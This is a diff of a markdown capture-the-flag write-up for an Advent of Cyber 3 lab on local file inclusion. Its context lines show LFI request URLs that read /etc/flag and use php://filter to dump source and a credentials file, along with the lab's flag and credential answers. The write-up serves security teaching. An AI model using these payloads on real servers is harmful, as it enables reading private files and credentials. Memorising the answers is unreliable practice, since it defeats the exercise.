@@ -1,6 +1,6 @@
 # Advent of Cyber 3 (2021)
 
-> Dec. 1, 2021
+> Dec. 6, 2021
 
 ## [Day 6] Web Exploitation Patch Management Is Hard
 
@@ -8,7 +8,7 @@
 
 Once you find an LFI vulnerability, it is possible to read sensitive data if you have readable permissions on files. Thus, one of the most significant risks is leaking sensitive data accessed by a regular user. Also, in some cases, an LFI vulnerability could be chained to perform Remote Code Execution RCE on the server. If we can inject or write to a file on the system, we take advantage of LFI to get RCE. In this task, we prepared a web application with an LFI vulnerability and a possible way to get RCE. We'll be looking at this web application later.
 
-![](screenshots/AOC3_day6-0.png)
+![](../screenshots/AOC3_day6-0.png)
 
 1. Deploy the attached VM and look around. What is the entry point for our web application? 
 
@@ -26,7 +26,7 @@ hxxp://10.10.132.188/index.php?err=/etc/flag
 
 hxxp://10.10.132.188/index.php?err=php://filter/convert.base64-encode/resource=index.php
 
-![](screenshots/AOC3_day6-3.png)
+![](../screenshots/AOC3_day6-3.png)
 
 `Answer: THM{791d43d46018a0d89361dbf60d5d9eb8}`
 
@@ -34,7 +34,7 @@ hxxp://10.10.132.188/index.php?err=php://filter/convert.base64-encode/resource=i
 
 hxxp://10.10.132.188/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php
 
-![](screenshots/AOC3_day6-4.png)
+![](../screenshots/AOC3_day6-4.png)
 
 `Answer: McSkidy:A0C315Aw3s0m`
 
